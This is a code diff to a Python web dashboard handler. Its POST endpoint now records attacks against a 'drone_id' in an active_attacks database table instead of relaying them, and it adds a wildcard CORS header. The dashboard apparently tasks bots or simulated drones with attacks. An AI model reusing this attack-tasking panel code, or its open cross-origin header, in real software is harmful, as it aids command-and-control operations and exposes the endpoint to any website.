@@ -1132,10 +1132,27 @@ class DashboardHandler(BaseHTTPRequestHandler):
             command = post_data.get("command")
             params = post_data.get("params", {})
             
-            result = attack_relay.start_attack(drone_id, command, params)
+            import uuid
+            attack_id = "ATK-" + str(uuid.uuid4())[:8]
+            t_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+            
+            conn = sqlite3.connect(DB_FILE_PATH, timeout=30)
+            try:
+                cursor = conn.cursor()
+                cursor.execute(
+                    "INSERT INTO active_attacks (attack_id, drone_id, attack_type, status, started_at, params) VALUES (?, ?, ?, ?, ?, ?)",
+                    (attack_id, drone_id, command, "IN PROGRESS", t_str, json.dumps(params))
+                )
+                conn.commit()
+                result = {"success": True, "attack_id": attack_id}
+            except Exception as e:
+                result = {"success": False, "error": str(e)}
+            finally:
+                conn.close()
             
             self.send_response(200)
             self.send_header("Content-type", "application/json")
+            self.send_header("Access-Control-Allow-Origin", "*")
             self.end_headers()
             self.wfile.write(json.dumps(result).encode('utf-8'))
             return
